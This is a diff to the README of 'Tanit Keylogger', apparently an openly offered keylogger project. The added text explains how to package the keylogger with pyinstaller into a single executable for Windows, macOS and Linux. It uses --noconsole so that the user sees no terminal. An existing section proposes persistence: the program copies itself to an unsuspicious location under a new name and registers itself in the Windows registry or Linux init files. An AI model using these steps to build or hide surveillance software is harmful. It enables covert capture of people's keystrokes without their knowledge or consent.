@@ -56,7 +56,7 @@ pyinstaller main.py --onefile
 ```
 --onefile means  pyinstaller will package all the python files into a single executable
 
-## How to package and run an excutable silently
+## How to package and run an excutable silently (without showing a terminal to user)
 If you do not want the user to see a command prompt after the exe is run. You can add another argument called
 --noconsole
 
@@ -105,6 +105,25 @@ You can then package Tanit Keylogger into a single executable:
 ```
 wine /root/.wine/drive_c/Python27/Scripts/pyinstaller.exe main.py --onefile --noconsole
 ```
+The binary will be stored in the dist folder.
+
+## Creating a Mac OS executable of Tanit
+It is the same procedure using pyinstaller. First install pyinstaller through latest pip - with sudo privileges. NB: it is better to get the latest pip so to avoid errors. 
+
+```
+sudo pip install pyinstaller
+```
+
+Then run pyinstaller on main.py
+
+```
+pyinstaller main.py --onefile --noconsole
+```
+The binary will be stored in the dist folder.
+
+## Creating a Linux OS executable of Tanit
+The process is exactly similar. The good thing in Linux is that binaries in Linux don't get executed by just making the user double click them, they need to be run from the terminal. 
+
 # Enhancements
 ## Adding the program to registry
 One enhancement is to make the program copy itself to a location not suspicious with a new name and add itself to the registry (on MS Windows - very easy) or to the init deamon configuration files on Linux OSs (very tricky)
